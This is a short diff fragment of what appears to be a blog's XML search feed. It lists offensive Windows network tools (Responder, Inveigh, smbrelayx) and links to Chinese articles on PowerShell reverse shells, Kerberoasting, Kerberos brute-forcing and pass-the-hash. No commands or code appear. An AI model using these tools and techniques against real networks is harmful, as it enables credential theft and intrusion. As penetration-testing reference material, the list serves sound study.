+<li>Responder：<a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">https://github.com/SpiderLabs/Responder</a></li>
+<li>Inveigh：<a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Inveigh</a></li>
+<li>smbrealyx：<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbrelayx.py" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbrelayx.py</a></li>
+</ul>
+<p>参考链接：</p>
+<p><a href="https://www.anquanke.com/post/id/99793" target="_blank" rel="noopener">powershell反弹shell常见方式</a></p>
+<p><a href="https://www.anquanke.com/post/id/171552#h2-6" target="_blank" rel="noopener">Kerberos协议探索系列之扫描与爆破篇</a></p>
+<p><a href="https://3gstudent.github.io/域渗透-Kerberoasting/" target="_blank" rel="noopener">域渗透——Kerberoasting</a></p>
+<p><a href="https://www.cnblogs.com/bmjoker/p/10355979.html" target="_blank" rel="noopener">内网渗透之PTH&amp;PTT&amp;PTK</a></p>
+]]></content>
+      <tags>
+        <tag>WEB</tag>
       </tags>
   </entry>
   <entry>
